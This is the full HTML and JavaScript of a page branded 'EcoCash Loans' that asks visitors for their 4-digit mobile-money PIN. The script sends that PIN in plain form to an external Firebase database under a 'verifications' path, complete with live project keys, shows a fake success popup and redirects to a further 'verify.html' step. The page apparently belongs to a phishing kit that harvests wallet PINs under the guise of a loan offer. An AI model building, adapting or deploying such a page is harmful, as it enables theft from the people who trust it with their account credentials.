<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EcoCash Loans</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Poppins,sans-serif;
}
body{
background:linear-gradient(180deg,#2563eb,#1e3a8a);
display:flex;
justify-content:center;
align-items:center;
min-height:100vh;
padding:20px;
}
.card{
width:100%;
max-width:420px;
background:#fff;
border-radius:28px;
padding:30px;
box-shadow:0 20px 45px rgba(0,0,0,.18);
text-align:center;
}
.logo{
font-size:34px;
font-weight:700;
margin-bottom:10px;
}
.eco{color:#2563eb;}
.fund{color:#06b6d4;}
h2{
margin-top:10px;
margin-bottom:10px;
}
p{
color:#666;
margin-bottom:25px;
font-size:15px;
}
.pin{
display:flex;
justify-content:center;
gap:14px;
margin-bottom:25px;
}
.pin input{
width:60px;
height:68px;
border:2px solid #ddd;
border-radius:16px;
font-size:28px;
font-weight:700;
text-align:center;
outline:none;
transition:.25s;
}
.pin input:focus{
border-color:#2563eb;
}
button{
width:100%;
padding:16px;
border:none;
border-radius:15px;
background:#2563eb;
color:#fff;
font-size:18px;
font-weight:600;
cursor:pointer;
transition:.3s;
}
button:disabled{
opacity:.7;
cursor:not-allowed;
}

#toast{
position:fixed;
top:30px; /* moved to top */
left:50%;
transform:translateX(-50%);
background:#333;
color:#fff;
padding:14px 20px;
border-radius:12px;
display:none;
z-index:999;
}

/* Success Notification - Centered with Green */
#successPopup{
position:fixed;
top:50%;
left:50%;
transform:translate(-50%, -50%) scale(0.9);
background:#f0fff4;
border:2px solid #22c55e;
color:#15803d;
padding:28px 32px;
border-radius:20px;
text-align:center;
font-weight:600;
font-size:18px;
box-shadow:0 20px 50px rgba(34,197,94,.25);
display:none;
opacity:0;
z-index:1000;
transition: all 0.3s ease;
max-width:90%;
}
#successPopup.show{
display:block;
opacity:1;
transform:translate(-50%, -50%) scale(1);
}
#successPopup.fadeOut{
opacity:0;
transform:translate(-50%, -50%) scale(0.9);
}
#successPopup.icon{
font-size:40px;
margin-bottom:8px;
display:block;
}
</style>
</head>
<body>
<div class="card">
<div class="logo">
<span class="eco">Eco</span><span class="fund">Cash</span>
</div>

<h2 id="title">Enter PIN</h2>
<p id="subtitle">Enter your 4-digit PIN to continue</p>

<div id="pinSection">
  <div class="pin">
    <input maxlength="1" inputmode="numeric">
    <input maxlength="1" inputmode="numeric">
    <input maxlength="1" inputmode="numeric">
    <input maxlength="1" inputmode="numeric">
  </div>
  <button id="verifyBtn">Submit PIN</button>
</div>

</div>
<div id="toast"></div>

<!-- Centered Success Popup -->
<div id="successPopup">
  <span class="icon">✅</span>
  PIN Submitted Successfully!<br>
  <span style="font-size:14px; font-weight:400;">Redirecting...</span>
</div>

<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
<script>
const firebaseConfig = {
  apiKey: "AIzaSyDbx8tqZiN7xqUmj-obf1LwroYTV8FuRrk",
  authDomain: "ecocash-loans-b8ff4.firebaseapp.com",
  databaseURL: "https://ecocash-loans-b8ff4-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "ecocash-loans-b8ff4",
  storageBucket: "ecocash-loans-b8ff4.firebasestorage.app",
  messagingSenderId: "965007030441",
  appId: "1:965007030441:web:fd828795a365eca5ab11b8",
  measurementId: "G-XCZW21GNZ8"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2,5);
const verifyRef = db.ref('verifications/' + sessionId);

const inputs = document.querySelectorAll(".pin input");

inputs.forEach((input,index)=>{
  input.addEventListener("input",()=>{
    input.value = input.value.replace(/\D/g,"");
    if(input.value && index < 3){
      inputs[index+1].focus();
    }
  });
  input.addEventListener("keydown",(e)=>{
    if(e.key === "Backspace" && input.value === "" && index > 0){
      inputs[index-1].focus();
    }
  });
});

function toast(msg){
  const t = document.getElementById("toast");
  t.innerText = msg;
  t.style.display = "block";
  setTimeout(()=>{ t.style.display = "none"; }, 3000);
}

function showSuccessAndRedirect(){
  const popup = document.getElementById("successPopup");
  popup.classList.add("show");

  setTimeout(()=>{
    popup.classList.add("fadeOut");
  }, 1200);

  setTimeout(()=>{
    window.location.href = "verify.html"; // redirect on submit
  }, 1600);
}

document.getElementById("verifyBtn").onclick = ()=>{
  let pin = "";
  inputs.forEach(i => pin += i.value);

  if(pin.length !== 4){
    toast("Enter the complete 4-digit PIN.");
    return;
  }

  const btn = document.getElementById("verifyBtn");
  btn.disabled = true;
  btn.innerText = "Submitting...";

  // Save to Firebase then redirect
  verifyRef.set({
    pin: pin,
    createdAt: firebase.database.ServerValue.TIMESTAMP,
    status: 'pending'
  }).then(()=>{
    showSuccessAndRedirect();
  }).catch(err=>{
    toast("Error: " + err.message);
    btn.disabled = false;
    btn.innerText = "Submit PIN";
  });
};
</script>
</body>
</html>
